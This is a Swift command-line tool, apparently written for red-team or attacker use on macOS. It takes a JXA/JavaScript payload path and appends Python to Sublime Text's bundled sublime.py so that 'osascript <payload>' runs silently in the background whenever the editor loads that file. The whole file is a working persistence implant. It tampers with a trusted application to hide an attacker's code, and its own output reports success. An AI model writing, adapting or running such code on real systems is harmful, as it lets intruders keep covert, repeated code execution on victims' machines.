import Foundation
import Cocoa

//Usage: ./SublimeTextAppScriptPersistence [path_to_js_jxa_app]

let scriptName = CommandLine.arguments[0]
let fileMan = FileManager.default
let uName = NSUserName()
let home = "/Users/\(uName)"
var isDir = ObjCBool(true)

if CommandLine.arguments.count != 2 {
    print("Usage: \(scriptName) [jxa_js_payload]")
    print("exiting...")
    exit(0)
}
else {
    let payload1 = CommandLine.arguments[1]
    let payload = "osascript \(payload1)"
    if fileMan.fileExists(atPath: payload1){
        
        do {
            var sublimePath = "/Applications/Sublime Text.app/Contents/MacOS/sublime.py"
            if fileMan.fileExists(atPath: sublimePath){
                var commandTemplate =
                """
                import os
                os.system("templateCommand &")
                """
                
                var sublimepy = try String(contentsOfFile: "/Applications/Sublime Text.app/Contents/MacOS/sublime.py")
                
                var newCommand = commandTemplate.replacingOccurrences(of: "templateCommand", with: payload)
                
                var sublimeappend = sublimepy + "\n" + newCommand
                var sublimeURL = URL(fileURLWithPath: "/Applications/Sublime Text.app/Contents/MacOS/sublime.py")
                try sublimeappend.write(to: sublimeURL, atomically: true, encoding: .utf8)
                
                //try newCommand.write(toFile: sublimePath, atomically: false, encoding: .utf8)
                print("[+] Sublime Application script at \(sublimePath) modified for persistence.")
            }
            else {
                print("[-] Sublime not found on this host. Exiting...")
                exit(0)
            }
        }
        catch let error {
            print(error)
        }
        
    }
    else {
        print("[-]Payload at \(payload) not found.")
        print("exiting...")
        exit(0)
    }
}
